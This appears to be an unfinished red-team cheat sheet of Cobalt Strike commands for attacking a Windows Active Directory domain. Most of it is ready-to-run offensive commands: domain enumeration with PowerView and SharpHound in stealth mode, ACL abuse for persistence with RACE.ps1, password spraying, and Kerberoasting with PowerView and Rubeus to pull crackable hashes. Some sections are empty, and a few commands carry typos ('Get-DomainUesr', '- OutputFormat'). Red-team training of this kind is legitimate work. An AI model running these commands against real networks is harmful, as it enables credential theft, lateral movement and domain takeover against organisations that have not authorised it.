# NOTE: WORK IN PROGRESS

# Cobalt Strike Red Team Cheat Sheet
---
## Domain Enumeration

Running PowerView and SharpView
```
PowerView:
# powershell-import --> Select PowerView.ps1 to import PS1 file in memory
# powershell Get-Module PowerView
# powershell Get-NetUser -Identity testuser -Domain lab.com

SharpView
# execute-assembly C:\SharpView.exe Invoke-CheckLocalAdminAccess --> Check servers for local admin using current privileges
```

Running ActiveDirectory module
```
# powershell import --> Select \ADModule\Microsoft.ActiveDirectory.Management.dll  file from https://github.com/samratashok/ADModule
# powershell Get-ADDomainController -Domain lab.com
```

Running Sharphound (.NET version of Bloodhound) for AD domain collection
```
Running SharpView in memory (.NET version of PowerView)
# execute-assembly C:\SharpHound.exe --CollectionMethod All --Domain lab.com --Stealth --excludedomaincontrollers --windowsonly --OutputDirectory C:\users\testuser\appdata\local\temp\

Collecting only user sessions to determine who is logged in and where:
# execute-assembly C:\SharpHound.exe --CollectionMethod Session,LoggedOn --Outputdirectory C:\temp\

Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html
```
---
## Local Privilege Escalation
PowerUp

-------------------------------------------------------------
## Lateral Movement
Invoke-TheHash

Enable Powershell Remoting manually
```
powershell 
```

[RACE.ps1](https://github.com/samratashok/RACE): ACL attacks for lateral movement, persistence and privilege escalation
```
# powershell-import --> RACE.ps1
# powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-dc.lab.com
# powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-dc.lab.com
```
-------------------------------------------------------------
## Domain Privilege Escalation
### GPP Password
[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

### Password spraying
[DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)
```
Get a domain user list
# powershell Get-DomainUserList -Domain lab.com -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt

Password spray from a username and password list
# powershell Invoke-DomainPasswordSpray -UserList userlist.txt -PasswordList passlist.txt -Domain lab.com -OutFile sprayed-creds.txt

Auto spray a specific password on an auto-generated user list (noisy)
# powershell Invoke-DomainPasswordSpray -Password Winter2020
```

### Kerberoasting
PowerView kerberoasting
```
Get users with SPN set
# powershell Get-DomainUesr -SPN

Kerberoast all users
# powershell Invoke-Kerberoast - OutputFormat hashcat | fl

Kerberoast specific user
# powershell Invoke-Kerberoast -Identity testaccount -Domain lab.com -OutputFormat hashcat | fl
```

Rubeus kerberoasting
```
Kerberoast all users:
# execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:lab.com

Kerberoast specific user:
# execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com
```

---
## Exfiltration - Password Attacks


---
# References
Cobalt Strike commands cheat-sheet: https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet
Sharphound: https://github.com/BloodHoundAD/SharpHound3
